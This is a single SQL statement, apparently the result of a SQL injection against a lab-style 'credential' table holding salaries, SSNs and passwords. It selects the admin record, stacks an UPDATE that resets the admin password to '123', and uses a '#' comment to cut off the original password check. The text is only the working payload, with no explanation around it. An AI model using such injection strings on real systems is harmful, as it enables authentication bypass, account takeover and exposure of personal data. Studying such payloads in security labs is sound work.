SELECT id, name, eid, salary, birth, ssn, address, email,nickname, Password FROM credential WHERE name= &#x27;admin&#x27;; UPDATE credential SET Password = &#x27;123&#x27; WHERE username = &#x27;admin&#x27;; #&#x27; and Password=&#x27;123&#x27;
